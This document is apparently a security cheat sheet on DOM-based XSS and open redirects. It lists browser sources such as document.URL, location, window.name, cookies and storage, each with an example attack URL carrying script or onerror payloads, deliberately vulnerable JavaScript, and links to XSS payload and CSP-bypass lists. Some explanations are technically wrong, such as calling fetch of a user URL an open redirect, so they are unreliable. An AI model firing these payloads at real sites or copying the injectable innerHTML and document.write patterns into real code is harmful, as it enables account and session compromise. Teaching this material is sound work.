### 1. **`document.URL` and `document.documentURI`**
Both return the URL of the current document. If inserted into a page without sanitization, they can be exploited for XSS.

**Example Payload URL:**
```bash
https://victim.com/page?url=<script>alert('XSS')</script>
```

**Code:**
```html
<p id="demo"></p>
<script>
    var url = document.URL;
    document.getElementById("demo").innerHTML = "Current URL: " + url;
</script>
```
If the URL parameter is displayed directly on the page, the script can execute without sanitization.

---

### 2. **`document.baseURI`**
This property returns the base URL of the document. It can lead to open redirects if used without validation.

**Example Open Redirect:**
```bash
https://victim.com/?redirect=https://evil.com
```

**Code:**
```html
<script>
    var redirectURL = document.baseURI + new URLSearchParams(window.location.search).get('redirect');
    window.location.href = redirectURL;
</script>
```
If `redirect` is processed without validation, users can be sent to a malicious site.

---

### 3. **`location` and `window.location`**
These refer to the current URL and are often used for XSS or open redirect if the URL data is used without validation.

**Example XSS Payload URL:**
```bash
https://victim.com/?name=<script>alert('XSS')</script>
```

**Code:**
```html
<p id="name"></p>
<script>
    var params = new URLSearchParams(window.location.search);
    var name = params.get('name');
    document.getElementById("name").innerHTML = "Hello " + name;
</script>
```
If the `name` parameter value is not sanitized, XSS can occur.

---

### 4. **`window.location.search`** (Accessing Query Parameters)
This returns the query string part of the URL. It can be dangerous if used to inject data into the DOM without sanitization.

**Example:**
```bash
https://victim.com/search?query=<img src=x onerror=alert(1)>
```

**Code:**
```html
<p id="searchResult"></p>
<script>
    var searchQuery = window.location.search;
    document.getElementById("searchResult").innerHTML = "Search result for: " + searchQuery;
</script>
```

---

### 5. **`fetch()` and `XMLHttpRequest`**
Both are used to retrieve data from a server. If the URL is taken from user parameters, this can lead to open redirects or SSRF.

**Example Open Redirect:**
```bash
https://victim.com/fetch?url=https://evil.com
```

**Code:**
```html
<script>
    var params = new URLSearchParams(window.location.search);
    var targetURL = params.get('url');
    fetch(targetURL)
        .then(response => response.text())
        .then(data => console.log(data));
</script>
```
If `fetch` is used with a user-provided URL without validation, it can result in an open redirect.

---

### 6. **`document.cookie`**
Used to get or set cookies. XSS can occur if a cookie is set with user input without sanitization.

**Example:**
```bash
https://victim.com/?cookie=<script>alert(document.cookie)</script>
```

**Code:**
```html
<script>
    var params = new URLSearchParams(window.location.search);
    var cookieValue = params.get('cookie');
    document.cookie = "user=" + cookieValue;
</script>
```
If the cookie value is set without sanitization, XSS can occur.

---

### 7. **`window.name`**
`window.name` can store data that is accessible across pages. It can be used for XSS if this value is inserted into a page.

**Example Payload:**
```bash
https://victim.com#"><img src=x onerror=alert(1)>
```

**Code:**
```html
<script>
    var windowName = window.name;
    document.write("Window name is: " + windowName);
</script>
```

---

### 8. **`history.pushState()` and `history.replaceState()`**
Both are used to manipulate the URL without reloading the page. If data from the URL is inserted into the page without sanitization, XSS can occur.

**Example XSS:**
```bash
https://victim.com/?state="><script>alert(1)</script>
```

**Code:**
```html
<script>
    var params = new URLSearchParams(window.location.search);
    var state = params.get('state');
    history.pushState({}, '', '?state=' + state);
    document.write("New URL is: " + window.location.href);
</script>
```

---

### 9. **`localStorage` and `sessionStorage`**
Data stored in `localStorage` or `sessionStorage` can be abused if accessed or set with unsafe input.

**Example XSS:**
```bash
https://victim.com/?payload="><script>alert(1)</script>
```

**Code:**
```html
<script>
    var params = new URLSearchParams(window.location.search);
    var payload = params.get('payload');
    localStorage.setItem('data', payload);
    document.write("Stored payload is: " + localStorage.getItem('data'));
</script>
```

**blocked by csp?**
- [https://github.com/RHYru9/rhyru9.github.io/blob/main/xss-cheatsheet/csp.txt](https://github.com/RHYru9/rhyru9.github.io/blob/main/xss-cheatsheet/csp.txt)

**xss without Prentheses**
- [https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md](https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md)
---
